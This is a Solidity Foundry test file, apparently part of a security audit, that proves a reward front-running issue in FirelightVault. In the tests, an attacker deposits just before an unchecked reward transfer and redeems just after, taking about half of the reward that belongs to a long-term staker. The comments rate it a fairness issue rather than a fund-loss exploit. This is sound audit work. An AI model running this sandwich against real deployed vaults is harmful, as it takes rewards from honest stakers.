// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {FirelightVault} from "contracts/core/FirelightVault.sol";
import {MockERC20} from "contracts/test/MockERC20.sol";

/// @notice PoC for candidate finding F4: reward drops are un-checkpointed raw transfers that raise
/// live totalAssets() without minting shares, and share value is priced off live totalAssets()
/// (_previewTotals). A depositor who enters right before a reward drop and requests withdrawal right
/// after captures a pro-rata slice of the reward with (essentially) no staking wall-clock duration.
///
/// MITIGANT (why this is NOT free money / not high severity): the redeemed value lands in withdrawal
/// bucket capturePeriod+1, which FirelightVault.payout drains for an incident captured in the same
/// period — even retroactively for the whole period, not just the time Bob was present. So the
/// front-runner takes on genuine one-period cover exposure to capture the reward; ex-ante this is the
/// same risk-adjusted return as any one-period staker. This is a reward-JIT / lump-sum-reward
/// fairness issue (favors just-in-time liquidity over time-committed stakers), not a fund-loss
/// exploit. The fix (time-weighted / streamed reward accrual, or checkpointed reward inflows) matters
/// only if rewards are intended to accrue to committed stakers.
contract F4RewardFrontRun is Test {
    FirelightVault internal vault;
    MockERC20 internal asset;

    address internal alice = address(0xA11CE); // honest, long-term staker
    address internal bob = address(0xB0B); // attacker sandwiching the reward drop

    uint48 internal start;
    uint256 internal constant STAKE = 1000e18;
    uint256 internal constant REWARD = 200e18;

    function setUp() public {
        start = uint48(1_000_000);
        vm.warp(start);

        asset = new MockERC20("Mock Asset", "mASSET", 18);
        FirelightVault impl = new FirelightVault();
        FirelightVault.InitParams memory p = FirelightVault.InitParams({
            defaultAdmin: address(this),
            limitUpdater: address(this),
            blocklister: address(this),
            pauser: address(this),
            periodConfigurationUpdater: address(this),
            rescuer: address(this),
            depositLimit: 1e30,
            periodConfigurationDuration: uint48(1 days)
        });
        bytes memory initCall = abi.encodeWithSelector(
            FirelightVault.initialize.selector, IERC20(address(asset)), "FL", "FL", abi.encode(p)
        );
        vault = FirelightVault(address(new ERC1967Proxy(address(impl), initCall)));
    }

    function _deposit(address who, uint256 amt) internal {
        asset.mint(who, amt);
        vm.prank(who);
        asset.approve(address(vault), amt);
        vm.prank(who);
        vault.deposit(amt, who);
    }

    /// Replicates VaultRewardDistributor.distributeRewards' effect: a raw asset transfer into the
    /// vault (no _traceTotalAssets checkpoint, no shares minted).
    function _dropReward(uint256 amt) internal {
        asset.mint(address(vault), amt);
    }

    /// F4: Bob deposits right before a reward, redeems right after, and still captures ~half the
    /// reward despite the mandatory withdrawal delay.
    function test_F4_rewardFrontRunIsProfitable() public {
        // Alice is the pre-existing staker; the reward is meant to accrue to her.
        _deposit(alice, STAKE);

        // --- Attacker sandwiches the reward drop, all within period 0 ---
        _deposit(bob, STAKE); // front-run: enter just before the reward
        _dropReward(REWARD); // the distributor's raw transfer lands

        // back-run: Bob redeems everything -> value locked into the withdrawal bucket at the
        // POST-reward (appreciated) share price.
        uint256 bobShares = vault.balanceOf(bob);
        vm.prank(bob);
        vault.redeem(bobShares, bob, bob);

        // Advance past the bucket period so Bob can claim (no incident occurs).
        vm.warp(start + 2 days + 1 hours);

        uint256 bobBefore = asset.balanceOf(bob);
        vm.prank(bob);
        vault.claimWithdraw(1);
        uint256 bobReceived = asset.balanceOf(bob) - bobBefore;

        emit log_named_uint("bob deposited", STAKE);
        emit log_named_uint("bob received ", bobReceived);
        emit log_named_int("bob profit  ", int256(bobReceived) - int256(STAKE));

        // Bob profits from a reward he did not earn over time: ~REWARD * STAKE / (STAKE+STAKE).
        assertGt(bobReceived, STAKE, "F4: front-runner did NOT profit");
        // Expect roughly half the reward (minus rounding dust).
        assertApproxEqAbs(bobReceived - STAKE, REWARD / 2, 1e12, "F4: skim not ~half the reward");
    }

    /// Control: the reward that Bob skimmed is exactly value taken from Alice — with Bob present she
    /// receives only ~half the reward instead of all of it.
    function test_F4_honestStakerIsDiluted() public {
        _deposit(alice, STAKE);
        _deposit(bob, STAKE);
        _dropReward(REWARD);

        // Bob exits via the bucket.
        uint256 bobShares = vault.balanceOf(bob);
        vm.prank(bob);
        vault.redeem(bobShares, bob, bob);

        // Alice exits too.
        uint256 aliceShares = vault.balanceOf(alice);
        vm.prank(alice);
        vault.redeem(aliceShares, alice, alice);

        vm.warp(start + 2 days + 1 hours);

        uint256 aBefore = asset.balanceOf(alice);
        vm.prank(alice);
        vault.claimWithdraw(1);
        uint256 aliceReceived = asset.balanceOf(alice) - aBefore;

        emit log_named_uint("alice received", aliceReceived);
        // Alice should have earned the full REWARD (she was the only real staker); instead Bob's
        // sandwich cut her share to ~half.
        assertApproxEqAbs(aliceReceived - STAKE, REWARD / 2, 1e12, "F4: dilution not ~half");
        assertLt(aliceReceived - STAKE, REWARD, "F4: alice unexpectedly kept the full reward");
    }
}
